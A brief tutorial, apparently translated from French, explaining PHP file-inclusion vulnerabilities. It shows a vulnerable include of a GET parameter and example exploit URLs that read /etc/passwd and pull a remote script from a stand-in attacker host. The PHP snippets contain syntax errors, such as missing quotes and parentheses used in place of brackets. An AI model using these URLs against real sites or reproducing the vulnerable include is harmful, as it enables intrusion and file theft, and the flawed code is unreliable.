# The include fault

The include () function in PHP is used to execute php code that is located in another file. Example:

```
<?php

include(bth.php)
```

In this case, the code in bth.php will be executed.

If the developer writes this code:
```
<?php

include($_GET('file'));
```

To exploit this vulnerability, we can use the following URL:

>monsite.tld/index.php?file=/etc/passwd

Here the "include" function will include the text of the "/ etc / passwd" file, and thus display its contents. It is possible to change "/ etc / passwd" to another server file that is normally not accessible, or even remote code accessible from another server.

Exemple : 

>monsite.tld/index.php?file=http://badsite.tmld/script.txt